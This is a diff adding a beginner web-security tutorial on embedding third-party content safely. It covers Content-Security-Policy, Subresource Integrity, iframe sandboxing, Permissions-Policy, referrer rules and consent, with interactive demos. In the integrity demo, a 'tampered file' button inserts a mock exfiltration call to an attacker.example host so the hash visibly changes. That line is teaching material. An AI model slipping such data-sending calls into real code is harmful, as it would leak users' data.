@@ -1,15 +1,648 @@
 ---
-id: third-party-content-security
-title: "Third-Party Content Security: Sandbox, CSP, and CORS"
-sidebar_label: "Content Security & Isolation"
+id: html-third-party-content-security
+title: "Third-Party Content Security"
+sidebar_label: "Third-Party Content Security"
 sidebar_position: 8
 slug: /html/embedded-content/third-party-content-security
-description: "Protect web applications against clickjacking, XSS, and unauthorized data access when embedding third-party content using sandbox attributes and security policies."
+description: "Learn how to keep a page safe when it embeds content you did not write: the risks of scripts, iframes and widgets, Content-Security-Policy, Subresource Integrity, iframe sandbox, Permissions-Policy, referrer and link rules, consent and privacy, click-to-load, auditing, and incident planning, with live demos."
 keywords:
+  - third party content security
+  - Content-Security-Policy tutorial
+  - CSP script-src frame-src
+  - Subresource Integrity SRI
   - iframe sandbox security
-  - third party content isolation
-  - Content Security Policy iframe
-  - prevent clickjacking HTML
+  - Permissions-Policy header
+  - Referrer-Policy
+  - supply chain attack web
+  - clickjacking frame-ancestors
+  - third party scripts privacy consent
+  - rel noopener noreferrer
+  - learn HTML
   - CodeHarborHub HTML
-tags: [html, security, iframe, sandbox, csp]
+tags: [html, web-development, beginner, security, csp, sri, iframe, privacy, embedded-content, frontend]
 ---
+
+import {useEffect, useState} from 'react';
+
+export const selfOrigin = "https://shop.example";
+
+export const cspResources = [
+  {id: 1, label: "Your own script", kind: "script", url: "https://shop.example/app.js"},
+  {id: 2, label: "A library from a CDN", kind: "script", url: "https://cdn.example.com/lib.js"},
+  {id: 3, label: "An analytics script", kind: "script", url: "https://analytics.tracker.net/t.js"},
+  {id: 4, label: "An inline script block", kind: "inline", url: "inline"},
+  {id: 5, label: "A video player frame", kind: "frame", url: "https://player.example.com/embed/42"},
+  {id: 6, label: "Your own logo image", kind: "img", url: "https://shop.example/logo.png"},
+  {id: 7, label: "An advertising pixel", kind: "img", url: "https://ads.tracker.net/pixel.gif"},
+  {id: 8, label: "A small data: image", kind: "img", url: "data:image/png;base64,iVBOR"},
+  {id: 9, label: "A call to your own API", kind: "connect", url: "https://shop.example/api/cart"},
+  {id: 10, label: "A call to a third-party API", kind: "connect", url: "https://api.thirdparty.net/rates"},
+];
+
+export const directiveFor = {script: "script-src", inline: "script-src", frame: "frame-src", img: "img-src", connect: "connect-src"};
+
+export function cspAllows(policy, resource) {
+  const own = (policy[directiveFor[resource.kind]] || "").trim();
+  const fallback = (policy["default-src"] || "").trim();
+  const effective = own || fallback;
+  if (!effective) return true;                       // no rule means no restriction
+  const tokens = effective.split(/\s+/);
+  if (tokens.length === 1 && tokens[0] === "'none'") return false;
+  if (resource.kind === "inline") return tokens.includes("'unsafe-inline'");
+  if (resource.url.startsWith("data:")) return tokens.includes("data:") || tokens.includes("*");
+  const origin = new URL(resource.url).origin;
+  return tokens.some((token) => {
+    if (token === "*") return true;
+    if (token === "'self'") return origin === selfOrigin;
+    if (token === "https:") return origin.startsWith("https:");
+    if (token.startsWith("https://")) return origin === token.replace(/\/$/, "");
+    return false;
+  });
+}
+
+export function CspLab() {
+  const strict = {
+    "default-src": "'self'",
+    "script-src": "'self' https://cdn.example.com",
+    "frame-src": "https://player.example.com",
+    "img-src": "'self' data:",
+    "connect-src": "'self'",
+  };
+  const [policy, setPolicy] = useState(strict);
+  const [reportOnly, setReportOnly] = useState(false);
+  const names = Object.keys(strict);
+  const headerName = reportOnly ? "Content-Security-Policy-Report-Only" : "Content-Security-Policy";
+  const parts = names.filter((name) => (policy[name] || "").trim()).map((name) => name + " " + policy[name].trim());
+  const header = parts.length ? headerName + ": " + parts.join("; ") : "(no policy: everything is allowed)";
+  const results = cspResources.map((resource) => ({...resource, allowed: cspAllows(policy, resource)}));
+  const blocked = results.filter((entry) => !entry.allowed).length;
+  const loose = {
+    "default-src": "* 'unsafe-inline'",
+    "script-src": "",
+    "frame-src": "",
+    "img-src": "",
+    "connect-src": "",
+  };
+  const empty = {"default-src": "", "script-src": "", "frame-src": "", "img-src": "", "connect-src": ""};
+  return (
+    <div>
+      <p style={{display: "flex", gap: "0.5rem", flexWrap: "wrap", margin: "0 0 0.5rem"}}>
+        <button type="button" onClick={() => setPolicy(strict)}>A careful policy</button>
+        <button type="button" onClick={() => setPolicy(loose)}>A too-loose policy</button>
+        <button type="button" onClick={() => setPolicy(empty)}>No policy</button>
+        <label style={{marginInlineStart: "0.5rem"}}>
+          <input type="checkbox" checked={reportOnly} onChange={(event) => setReportOnly(event.target.checked)} /> Report-only mode
+        </label>
+      </p>
+      <fieldset style={{margin: "0 0 0.5rem"}}>
+        <legend>Allowed sources for each kind of resource (your page is {selfOrigin})</legend>
+        {names.map((name) => (
+          <p key={name} style={{margin: "0.2rem 0"}}>
+            <label>
+              <code>{name}</code>{" "}
+              <input
+                type="text"
+                value={policy[name] || ""}
+                onChange={(event) => setPolicy((old) => ({...old, [name]: event.target.value}))}
+                style={{width: "100%", maxWidth: "22rem", fontFamily: "monospace"}}
+              />
+            </label>
+          </p>
+        ))}
+      </fieldset>
+      <pre style={{margin: "0 0 0.6rem", whiteSpace: "pre-wrap", fontSize: "0.85em"}}><code>{header}</code></pre>
+      <table>
+        <caption>What would happen to each resource on the page</caption>
+        <thead>
+          <tr><th scope="col">Resource</th><th scope="col">Address</th><th scope="col">Checked by</th><th scope="col">Result</th></tr>
+        </thead>
+        <tbody>
+          {results.map((entry) => (
+            <tr key={entry.id}>
+              <th scope="row" style={{textAlign: "start"}}>{entry.label}</th>
+              <td><code>{entry.url}</code></td>
+              <td><code>{(policy[directiveFor[entry.kind]] || "").trim() ? directiveFor[entry.kind] : "default-src"}</code></td>
+              <td style={{color: entry.allowed ? "#15803d" : reportOnly ? "#b45309" : "#b91c1c"}}>
+                {entry.allowed ? "Loads" : reportOnly ? "Loads, but is reported" : "Blocked"}
+              </td>
+            </tr>
+          ))}
+        </tbody>
+      </table>
+      <p role="status" style={{margin: "0.5rem 0 0"}}>
+        {blocked === 0
+          ? "Everything loads. If that includes the tracker and the inline script, the policy is not protecting you."
+          : blocked + " of " + results.length + " resources " + (reportOnly ? "would be blocked. In report-only mode they still load, and the browser sends a report, so you can test safely." : "are blocked.")}
+      </p>
+      <p style={{margin: "0.4rem 0 0", fontSize: "0.9em", color: "#64748b"}}>
+        This is a simplified model of how a browser compares each resource with your policy, so you can see the idea. Real policies have more directives and rules, so always test yours in the browser's console.
+      </p>
+    </div>
+  );
+}
+
+export function SriDemo() {
+  const original = "console.log('library v1.2.3 loaded');";
+  const [expected, setExpected] = useState(original);
+  const [actual, setActual] = useState(original);
+  const [algo, setAlgo] = useState("sha384");
+  const [hashes, setHashes] = useState({expected: "…", actual: "…"});
+  const [unsupported, setUnsupported] = useState(false);
+  const names = {sha256: "SHA-256", sha384: "SHA-384", sha512: "SHA-512"};
+  useEffect(() => {
+    let cancelled = false;
+    async function digest(text) {
+      const buffer = await crypto.subtle.digest(names[algo], new TextEncoder().encode(text));
+      let binary = "";
+      new Uint8Array(buffer).forEach((byte) => { binary += String.fromCharCode(byte); });
+      return algo + "-" + btoa(binary);
+    }
+    if (typeof crypto === "undefined" || !crypto.subtle) {
+      setUnsupported(true);
+      return undefined;
+    }
+    Promise.all([digest(expected), digest(actual)]).then(([a, b]) => {
+      if (!cancelled) setHashes({expected: a, actual: b});
+    });
+    return () => { cancelled = true; };
+  }, [expected, actual, algo]);
+  if (unsupported) return <p role="status">This browser does not offer the hashing tools needed for this demo (they need a secure page, https or localhost).</p>;
+  const match = hashes.expected === hashes.actual;
+  return (
+    <div>
+      <p style={{margin: "0 0 0.5rem"}}>
+        <label>Hash algorithm{" "}
+          <select value={algo} onChange={(event) => setAlgo(event.target.value)}>
+            <option value="sha256">sha256</option>
+            <option value="sha384">sha384 (common choice)</option>
+            <option value="sha512">sha512</option>
+          </select>
+        </label>
+      </p>
+      <p style={{margin: "0 0 0.5rem"}}>
+        <label htmlFor="sri-expected" style={{display: "block"}}>The file you checked and pinned (when you wrote your page)</label>
+        <textarea id="sri-expected" rows={2} value={expected} onChange={(event) => setExpected(event.target.value)} spellCheck={false} style={{width: "100%", fontFamily: "monospace"}} />
+      </p>
+      <p style={{margin: "0 0 0.5rem"}}>
+        <label htmlFor="sri-actual" style={{display: "block"}}>The file the CDN serves today</label>
+        <textarea id="sri-actual" rows={3} value={actual} onChange={(event) => setActual(event.target.value)} spellCheck={false} style={{width: "100%", fontFamily: "monospace"}} />
+      </p>
+      <p style={{display: "flex", gap: "0.5rem", flexWrap: "wrap", margin: "0 0 0.5rem"}}>
+        <button type="button" onClick={() => setActual(expected + "\nsendDataTo('https://attacker.example');")}>Simulate a tampered file</button>
+        <button type="button" onClick={() => setActual(expected)}>Restore the original</button>
+      </p>
+      <pre style={{margin: "0 0 0.5rem", whiteSpace: "pre-wrap", wordBreak: "break-all", fontSize: "0.85em"}}><code>{'<script src="https://cdn.example.com/lib@1.2.3.js"\n        integrity="' + hashes.expected + '"\n        crossorigin="anonymous"></script>'}</code></pre>
+      <p style={{margin: "0 0 0.3rem", wordBreak: "break-all", fontSize: "0.85em"}}><strong>Hash of what the CDN serves:</strong> <code>{hashes.actual}</code></p>
+      <p role="status" style={{margin: 0, color: match ? "#15803d" : "#b91c1c"}}>
+        {match
+          ? "The hashes match, so the browser runs the script."
+          : "The hashes differ, so the browser refuses to run the script, and reports an integrity error. Your page loses the library, but your visitors are protected."}
+      </p>
+    </div>
+  );
+}
+
+export function ReviewChecklist() {
+  const items = [
+    "I know who the third party is, and why I need them",
+    "The content is loaded over https",
+    "It is loaded only after consent, where the law requires it",
+    "Heavy embeds load on click, or lazily",
+    "Frames have a title, and a sandbox where possible",
+    "Permissions (camera, location, and so on) are denied unless needed",
+    "Scripts from a CDN are version-pinned, with integrity hashes where possible",
+    "A Content-Security-Policy limits where code and frames can come from",
+    "The page still works if the third party is slow, blocked, or down",
+    "I have checked the widget with a keyboard and a screen reader",
+    "I have read their privacy terms, and listed them in my own privacy notice",
+    "I review and remove embeds I no longer use",
+  ];
+  const [checked, setChecked] = useState({});
+  const done = items.filter((_, index) => checked[index]).length;
+  const percent = Math.round((done / items.length) * 100);
+  return (
+    <form onSubmit={(event) => event.preventDefault()}>
+      <fieldset>
+        <legend>Before you add third-party content</legend>
+        {items.map((text, index) => (
+          <p key={text} style={{margin: "0.2rem 0"}}>
+            <label><input type="checkbox" checked={!!checked[index]} onChange={() => setChecked((old) => ({...old, [index]: !old[index]}))} /> {text}</label>
+          </p>
+        ))}
+      </fieldset>
+      <p style={{margin: "0.6rem 0 0.2rem"}}>
+        <progress max="100" value={percent} aria-label="Checklist progress" style={{width: "12rem", verticalAlign: "middle"}} /> {done} of {items.length}
+      </p>
+      <p role="status" style={{margin: 0}}>{done === items.length ? "Every item is ticked. Keep reviewing it as things change." : "Tick each item you have really checked."}</p>
+    </form>
+  );
+}
+
+Imagine you invite a guest into your home. You know your own family, but you do not know everything about your guest, or the friends they bring. If a guest is careless, or has bad intentions, they can make a mess of your house, or watch what your family does, and **your visitors will blame you.**
+
+Every time your page loads something from **another website** (a video player, a map, an analytics script, a font, a chat widget, an advert, a library from a CDN), you are inviting a guest into your page. This final lesson in the section teaches you how to be a careful host.
+
+<AdsComponent />
+<br />
+
+## What You Will Learn
+
+- What counts as third-party content, and what can go wrong
+- Controlling what may load, with **Content-Security-Policy**
+- Checking that a file has not changed, with **Subresource Integrity**
+- Restricting frames with `sandbox`, `allow`, and **Permissions-Policy**
+- Controlling what other sites learn, with referrer rules
+- Consent, privacy, and the click-to-load pattern
+- Reviewing, monitoring, and planning for incidents
+
+## What Is Third-Party Content?
+
+**First-party** content is served by you, from your own site. **Third-party** content is served by someone else, but shown on your page.
+
+| Kind | Examples |
+| :-- | :-- |
+| **Scripts** | Analytics, advertising, chat widgets, tag managers, libraries from a CDN |
+| **Frames** | Video players, maps, payment forms, social posts, booking widgets |
+| **Styles and fonts** | Font services, CSS libraries |
+| **Images and pixels** | Adverts, tracking pixels, images hosted elsewhere |
+| **Data calls** | Requests from your scripts to someone else's API |
+| **Links and redirects** | Links out, or short-link services |
+
+Much of the modern web is made of these. They save time and give features you could not build yourself. But each one comes with **trust** attached.
+
+## What Can Go Wrong?
+
+| Risk | What happens |
+| :-- | :-- |
+| **A script is changed or hacked** (a "supply chain" attack) | Harmful code runs on your page, with the same power as your own: it can read what visitors type, change the page, and send data away |
+| **Tracking** | The third party sees who visited which page, and sets cookies, often across many sites |
+| **Slow or broken services** | Your page hangs, or breaks, because someone else's server is down |
+| **Malicious adverts or widgets** | Pop-ups, redirects, fake warnings, or downloads appear on your page |
+| **Clickjacking** | Someone frames your page invisibly, and tricks visitors into clicking on it |
+| **Excess permissions** | A frame asks for the camera, microphone, or location |
+| **Leaked information** | The address of the page, including private parts, is sent to the third party in the referrer |
+| **Privacy and legal problems** | Loading trackers without consent can break the law in many places |
+
+**A third-party script has the same power as your own code.** If you load it, you trust it with your visitors' data. That is why the rest of this lesson matters.
+
+## Defence in Layers
+
+No single tool solves everything. Good security uses **layers**, so that one failure does not mean total failure:
+
+| Layer | Tool | What it does |
+| :-- | :-- | :-- |
+| 1. **Choose well** | Review, remove, self-host | Fewer guests, and ones you trust |
+| 2. **Limit what may load** | Content-Security-Policy | Only allowed sources can run or show |
+| 3. **Check what loads** | Subresource Integrity | A changed file is refused |
+| 4. **Fence it in** | `sandbox`, `allow`, Permissions-Policy | Embedded content gets only the permissions it needs |
+| 5. **Say less** | Referrer-Policy, `rel`, cookies | Other sites learn less about your visitors |
+| 6. **Ask first** | Consent, click-to-load | Nothing loads until the visitor agrees |
+| 7. **Plan for failure** | Fallbacks, monitoring, incident plan | The page still works, and you notice problems |
+
+## Layer 2: Content-Security-Policy
+
+A **Content-Security-Policy (CSP)** is a rule list, sent by your server in a response header. It tells the browser **where each kind of content is allowed to come from.** Anything else is blocked, even if an attacker managed to put it on your page.
+
+```text
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://cdn.example.com;
+  frame-src https://player.example.com;
+  img-src 'self' data:;
+  connect-src 'self' https://api.shop.example;
+  object-src 'none';
+  base-uri 'self';
+  frame-ancestors 'self'
+```
+
+| Directive | Controls |
+| :-- | :-- |
+| `default-src` | The fallback for any directive you do not set |
+| `script-src` | Where scripts may come from, and whether inline scripts run |
+| `style-src` | Stylesheets |
+| `img-src` | Images |
+| `connect-src` | `fetch`, XHR, WebSocket, and similar calls |
+| `frame-src` | Which pages **you** may embed in frames |
+| `frame-ancestors` | Which sites may embed **your** page (the defence against clickjacking) |
+| `object-src` | `object` and `embed` content. `'none'` is a good choice |
+| `base-uri` | Which addresses `<base>` may use |
+
+Common source values: `'self'` (your own origin), `'none'` (nothing), `https:` (any secure address), a specific origin such as `https://cdn.example.com`, and `data:`. Note the quotes around `'self'` and `'none'`.
+
+### Try It: Write a Policy
+
+Edit the allowed sources. The table shows what would happen to ten typical resources. Try the **too-loose** policy, the **report-only** switch, and removing `'unsafe-inline'`.
+
+<Tabs>
+<TabItem value="code" label="HTML Code" default>
+
+```text title="Response header"
+Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; frame-src https://player.example.com; img-src 'self' data:; connect-src 'self'
+```
+
+```html title="Or, as a fallback, in the page (some directives are ignored here)"
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self'; script-src 'self' https://cdn.example.com">
+```
+
+</TabItem>
+<TabItem value="output" label="Browser Output">
+
+<BrowserWindow url="http://127.0.0.1:5500/index.html">
+<>
+<CspLab />
+</>
+</BrowserWindow>
+
+</TabItem>
+</Tabs>
+
+### CSP in Practice
+
+- **Prefer the header** to the `<meta>` tag. The meta version cannot use some directives, such as `frame-ancestors`, and it only applies after the browser has read it.
+- **Avoid `'unsafe-inline'` and `'unsafe-eval'`** for scripts. They allow the very kind of code that attacks use. If you must have inline scripts, use a **nonce** (a random value, new on every response: `script-src 'nonce-R4nd0m'`, and `<script nonce="R4nd0m">`) or a **hash**.
+- **Start in report-only mode.** Send `Content-Security-Policy-Report-Only` first. The browser **allows** everything, but **reports** what would be blocked. Fix the problems, then switch to the enforcing header.
+- **Watch the console.** Blocked resources appear as errors in the browser's developer tools.
+- **Be specific.** `https:` or `*` allows far more than you intend.
+- **Keep it up to date.** Each new widget you add may need a new entry, which is a good moment to ask whether you need it.
+- **CSP limits damage, but is not a cure.** Keep your own code safe too (escape output, validate input).
+
+## Layer 3: Subresource Integrity
+
+When you load a library from a CDN, you trust that the CDN serves the **same file tomorrow** as today. **Subresource Integrity (SRI)** removes that assumption. You put a **hash** (a fingerprint) of the file in your page. If the file changes by even one character, the fingerprint no longer matches, and the browser **refuses to run it.**
+
+```html
+<script
+  src="https://cdn.example.com/lib@1.2.3/lib.min.js"
+  integrity="sha384-BASE64HASHGOESHERE"
+  crossorigin="anonymous"></script>
+
+<link
+  rel="stylesheet"
+  href="https://cdn.example.com/lib@1.2.3/lib.min.css"
+  integrity="sha384-BASE64HASHGOESHERE"
+  crossorigin="anonymous">
+```
+
+### Try It: Break the Fingerprint
+
+The demo below really calculates the hashes in your browser. Press **Simulate a tampered file** and watch the second hash change, and the verdict flip.
+
+<Tabs>
+<TabItem value="code" label="HTML Code" default>
+
+```bash title="Make a hash on the command line"
+curl -s https://cdn.example.com/lib@1.2.3/lib.min.js \
+  | openssl dgst -sha384 -binary \
+  | openssl base64 -A
+# then write: integrity="sha384-" followed by the output
+```
+
+```js title="Or in JavaScript"
+const bytes = new TextEncoder().encode(fileText);
+const buffer = await crypto.subtle.digest("SHA-384", bytes);
+const hash = btoa(String.fromCharCode(...new Uint8Array(buffer)));
+console.log("sha384-" + hash);
+```
+
+</TabItem>
+<TabItem value="output" label="Browser Output">
+
+<BrowserWindow url="http://127.0.0.1:5500/index.html">
+<>
+<SriDemo />
+</>
+</BrowserWindow>
+
+</TabItem>
+</Tabs>
+
+Rules for SRI:
+
+- **Pin the exact version** in the address (`lib@1.2.3`), never "latest". A file that is meant to change will fail its own hash.
+- **Use it only for files that do not change**, such as versioned libraries. It does not suit analytics or advert scripts, which change often by design.
+- **Add `crossorigin="anonymous"`.** The CDN must send CORS headers, or the check will fail.
+- **Have a plan for a failed check.** The script will not run, so the page needs a fallback.
+- **Better still, host the file yourself** when you can. Then you control it.
+
+## Layer 4: Fence It In
+
+### Frames: `sandbox` and `allow`
+
+As you saw in [Iframe](./iframe), the `sandbox` attribute removes permissions from a frame, and you add back only what is needed. The `allow` attribute grants powerful features such as fullscreen, camera, microphone, or location, which are off by default for frames from other sites.
+
+```html
+<iframe
+  src="https://player.example.com/embed/42"
+  title="Interview with a baker (video, 12 minutes)"
+  sandbox="allow-scripts allow-same-origin allow-presentation"
+  allow="fullscreen; picture-in-picture"
+  referrerpolicy="strict-origin-when-cross-origin"
+  loading="lazy"></iframe>
+```
+
+Remember the warning: **do not combine `allow-scripts` and `allow-same-origin` for content from your own origin.**
+
+### Permissions-Policy
+
+The **`Permissions-Policy`** response header sets, for your whole page, which powerful features may be used at all, by you and by any frames:
+
+```text
+Permissions-Policy: camera=(), microphone=(), geolocation=(self), payment=()
+```
+
+An empty list `()` means "nobody, including me". `(self)` means only your own origin. It is a useful safety net: even if a third-party widget asks for the camera, the answer is no.
+
+### Your own pages: `frame-ancestors`
+
+To stop others from framing **your** pages (clickjacking), send:
+
+```text
+Content-Security-Policy: frame-ancestors 'self'
+```
+
+`X-Frame-Options: DENY` or `SAMEORIGIN` is an older header that does a similar job.
+
+## Layer 5: Say Less
+
+### Referrer-Policy
+
+When a visitor's browser loads a third-party resource or follows a link, it may tell the other site **which page it came from**. That address can include private information (a search term, an account number, a reset token). Limit it:
+
+```text
+Referrer-Policy: strict-origin-when-cross-origin
+```
+
+This sends the full address only within your own site, and only the origin (the site name) to others, and nothing at all on a drop from https to http. For something sensitive, use `no-referrer`. You can also set it per element with `referrerpolicy="no-referrer"` on iframes, images, scripts, and links.
+
+**Never put secrets in addresses** (tokens, passwords, personal data). Addresses leak into logs, history, and referrers.
+
+### Links
+
+```html
+<a href="https://other.example" target="_blank" rel="noopener noreferrer">Visit their site</a>
+```
+
+- **`rel="noopener"`** stops the new tab from controlling your page through `window.opener`. Current browsers do this by default for `target="_blank"`, but writing it costs nothing, and helps older ones.
+- **`rel="noreferrer"`** also stops the referrer from being sent.
+- For links in **user-written content**, use `rel="ugc nofollow noopener noreferrer"`, and for adverts or paid links, `rel="sponsored"`.
+
+### Cookies
+
+Cookies set by third parties can follow visitors from site to site. For your own cookies, use the safe attributes: `Secure`, `HttpOnly`, and `SameSite=Lax` (or `Strict`).
+
+```text
+Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax; Path=/
+```
+
+Many browsers now block or limit third-party cookies, but do not rely on that. Plan as if trackers can still see your visitors.
+
+## Layer 6: Ask First, and Load Later
+
+- **Consent.** In many places (the EU, the UK, and increasingly elsewhere), the law requires you to get a visitor's agreement **before** loading trackers and some third-party content, and to make "reject" as easy as "accept". Rules vary by place and over time, so check what applies to you. This lesson is not legal advice.
+- **Click-to-load.** Show a placeholder, and create the frame or load the script only when the visitor asks. Nothing is sent to the third party until then. See the example in [Maps](./maps).
+- **Make consent accessible.** A cookie banner must work with a keyboard and a screen reader, must not trap focus, and must not cover the page's content.
+- **Be honest in your privacy notice.** List the third parties, what they receive, and why.
+
+## Layer 1 and 7: Choose Well, and Plan for Failure
+
+- **Keep an inventory.** List every third party your site loads from. Open the browser's network panel, and see who is really there. Sites are often surprised.
+- **Remove what you do not need.** Every widget is a risk, and a cost in speed.
+- **Self-host where you can:** libraries, fonts, and images. You control them, and you save a connection.
+- **Be careful with tag managers.** They let people add scripts without a code review. Restrict who can publish, and review what is added.
+- **Choose reputable providers,** and read their security and privacy information. Check that they are accessible, too.
+- **Load third-party scripts with `async` or `defer`,** so a slow server does not block your page.
+- **Make the page work without them.** If the chat widget, the map, or the analytics script fails, the page should still do its job.
+- **Watch for changes.** Use CSP reports, and check your page regularly for new requests.
+- **Have an incident plan.** Know how you would remove a compromised script quickly, who decides, and how you would tell your visitors.
+
+### Try It: Review Before You Embed
+
+Use this checklist whenever you add something to your page, and again every few months.
+
+<BrowserWindow url="http://127.0.0.1:5500/index.html">
+<>
+<ReviewChecklist />
+</>
+</BrowserWindow>
+
+## Untrusted Content from Your Own Visitors
+
+Third-party content is not only other companies. **Your visitors' words are also untrusted:** comments, profile names, uploaded files.
+
+- **Show text with `textContent`,** never `innerHTML`.
+- **If you must allow some HTML,** clean it with a well-tested sanitiser library, on the server, and again before inserting it.
+- **Show uploaded SVG with `img`,** not inline or in `object`, and clean uploads on the server.
+- **Escape values** when you put them into attributes, links, and scripts.
+- **Check file type and size** on the server, and serve uploads from a **separate domain**, so a harmful file cannot reach your main site's cookies.
+
+## Accessibility at a Glance
+
+- **You inherit the accessibility of what you embed.** A widget that traps keyboard focus, or has no labels, makes your page inaccessible, whoever wrote it.
+- **Ask vendors for an accessibility statement,** and test their widgets with a keyboard and a screen reader before adding them.
+- **Give every frame a `title`.**
+- **Make security tools accessible:** cookie banners, consent buttons, and CAPTCHAs must be usable by everyone, with an alternative for CAPTCHAs.
+- **Provide a text alternative** if a third-party service fails or is blocked.
+- **Do not let sandboxing or blocking silently break** features people rely on. Provide a link to the content.
+
+## Global Audience Notes
+
+- **Laws differ:** consent, data transfer, and tracking rules change from region to region. A design that works in one country may not be enough in another.
+- **Some services are blocked or slow in some countries.** If a blocked script stops your page working, visitors there get nothing. Make third-party content optional, and give plain links.
+- **Third-party embeds can make pages heavy.** Many visitors are on slow or metered connections. Click-to-load and lazy loading help them most.
+- **Tell visitors in their language** what is loaded and why. Translate your consent text and privacy notice.
+- **Data may cross borders** when you use a third-party service. Know where it goes, and say so.
+- **Test from different regions and networks,** not only your own.
+
+## Common Mistakes to Avoid
+
+1. **Loading third-party scripts without knowing what they do.**
+2. **No Content-Security-Policy,** or one so loose it does nothing (`*`, `'unsafe-inline'`).
+3. **Switching on CSP without testing it in report-only mode first.**
+4. **Loading a CDN file with "latest" and no integrity hash.**
+5. **Using SRI on a file that is meant to change.**
+6. **Iframes with no `sandbox`,** and no `title`.
+7. **`allow-scripts` plus `allow-same-origin` on your own content.**
+8. **Granting camera, microphone, or location to frames that do not need them.**
+9. **Secrets in addresses,** which then leak through the referrer.
+10. **Loading trackers before consent.**
+11. **A page that breaks when a third party is slow or blocked.**
+12. **Never reviewing,** so old widgets and forgotten scripts stay on the page for years.
+
+## Practice Time
+
+Try these in your editor or in your browser's developer tools:
+
+1. Open the network panel on a real site you made, and list every third-party host.
+2. Remove one you do not really need.
+3. Add a `<meta>` CSP to a test page, and see what it blocks in the console.
+4. Switch to `Content-Security-Policy-Report-Only` on a test server, and read a report.
+5. Add an inline script with and without `'unsafe-inline'`, and see the difference.
+6. Add `integrity` and `crossorigin` to a script from a CDN. Then change one character in the hash, and watch it be refused.
+7. Add `sandbox` to an iframe, and add back one permission at a time.
+8. Add `referrerpolicy="no-referrer"` to a frame, and compare the requests.
+9. Replace an auto-loading map or video with a click-to-load button.
+10. Bonus: use the checklist above on your own site, and fix the first three items you cannot tick.
+
+<AdsComponent />
+<br />
+
+## Quick Recap
+
+Click a question to check your answer.
+
+<details>
+<summary>1. Why is a third-party script risky?</summary>
+
+It runs with the same power as your own code. If the provider is hacked, or the file is changed, it can read what visitors type, change the page, and send data away, and your visitors will blame you.
+
+</details>
+
+<details>
+<summary>2. What does a Content-Security-Policy do?</summary>
+
+It tells the browser where each kind of content (scripts, frames, images, connections) may come from, and blocks everything else, even if an attacker managed to inject it.
+
+</details>
+
+<details>
+<summary>3. Why start with report-only mode?</summary>
+
+In `Content-Security-Policy-Report-Only`, the browser allows everything but reports what would have been blocked. You can fix the problems before enforcing the policy, so nothing breaks.
+
+</details>
+
+<details>
+<summary>4. What does Subresource Integrity protect against?</summary>
+
+A file being changed after you pinned it, for example a CDN being compromised. The page includes a hash of the expected file, and the browser refuses to run any file that does not match.
+
+</details>
+
+<details>
+<summary>5. How do you stop other sites from framing your page?</summary>
+
+Send `Content-Security-Policy: frame-ancestors 'self'` (or a list of allowed sites). The older `X-Frame-Options` header does a similar job.
+
+</details>
+
+<details>
+<summary>6. How can you reduce what a third party learns about your visitors?</summary>
+
+Use click-to-load, ask for consent first, set `Referrer-Policy` or `referrerpolicy`, limit permissions with `sandbox`, `allow`, and Permissions-Policy, and never put secrets in addresses.
+
+</details>
+
+## Key Takeaways
+
+- **Every third-party script, frame, and font is a guest on your page,** with real power, and your visitors will hold you responsible.
+- Defend in **layers**: choose well, limit what loads, check what loads, fence it in, say less, ask first, and plan for failure.
+- Use **Content-Security-Policy** (start in report-only mode), and avoid `'unsafe-inline'` and wildcards.
+- Use **Subresource Integrity** with pinned versions for static libraries, and self-host when you can.
+- Use **`sandbox`, `allow`, Permissions-Policy, `frame-ancestors`, and `Referrer-Policy`** to restrict frames and what is shared.
+- Get **consent** where the law requires it, and use **click-to-load** for heavy or tracking embeds.
+- Make pages **work without** third parties, load scripts with `async` or `defer`, and keep an inventory you review regularly.
+- Treat **visitors' content** as untrusted too: use `textContent`, sanitise HTML, and show uploads safely.
+- Remember that you **inherit the accessibility** of everything you embed.
+
+Congratulations, you have finished the Embedded Content section. You can now embed pages, files, graphics, and maps, draw with SVG and canvas, and keep it all safe and accessible. Return to the [Embedded Content overview](../embedded-content) to review the lessons, or revisit [Iframe](./iframe) for the full set of frame options.
